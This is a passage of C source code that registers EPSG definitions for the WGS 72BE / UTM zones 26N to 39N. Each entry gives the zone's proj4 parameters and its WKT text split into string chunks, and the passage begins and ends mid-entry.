     \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-33],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32425\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32426, \"epsg\", 32426,\n        \"WGS 72BE / UTM zone 26N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=26 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 26N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-27],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32426\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32427, \"epsg\", 32427,\n        \"WGS 72BE / UTM zone 27N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=27 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 27N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-21],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32427\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32428, \"epsg\", 32428,\n        \"WGS 72BE / UTM zone 28N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=28 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 28N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-15],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32428\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32429, \"epsg\", 32429,\n        \"WGS 72BE / UTM zone 29N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=29 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 29N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-9],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32429\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32430, \"epsg\", 32430,\n        \"WGS 72BE / UTM zone 30N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=30 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 30N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-3],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32430\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32431, \"epsg\", 32431,\n        \"WGS 72BE / UTM zone 31N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=31 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 31N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",3],PARAMETER[\\\"scale_fac\");\n    add_srs_wkt (p, 9,\n        \"tor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAME\");\n    add_srs_wkt (p, 10,\n        \"TER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 11,\n        \"PSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\"\");\n    add_srs_wkt (p, 12,\n        \",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32431\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32432, \"epsg\", 32432,\n        \"WGS 72BE / UTM zone 32N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=32 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 32N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",9],PARAMETER[\\\"scale_fac\");\n    add_srs_wkt (p, 9,\n        \"tor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAME\");\n    add_srs_wkt (p, 10,\n        \"TER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 11,\n        \"PSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\"\");\n    add_srs_wkt (p, 12,\n        \",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32432\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32433, \"epsg\", 32433,\n        \"WGS 72BE / UTM zone 33N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=33 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 33N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",15],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32433\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32434, \"epsg\", 32434,\n        \"WGS 72BE / UTM zone 34N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=34 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 34N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",21],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32434\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32435, \"epsg\", 32435,\n        \"WGS 72BE / UTM zone 35N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=35 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 35N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",27],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32435\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32436, \"epsg\", 32436,\n        \"WGS 72BE / UTM zone 36N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=36 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 36N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",33],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32436\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32437, \"epsg\", 32437,\n        \"WGS 72BE / UTM zone 37N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=37 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 37N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",39],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32437\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32438, \"epsg\", 32438,\n        \"WGS 72BE / UTM zone 38N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=38 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 38N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",45],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32438\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32439, \"epsg\", 32439,\n        \"WGS 72BE / UTM zone 39N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=39 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 39N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        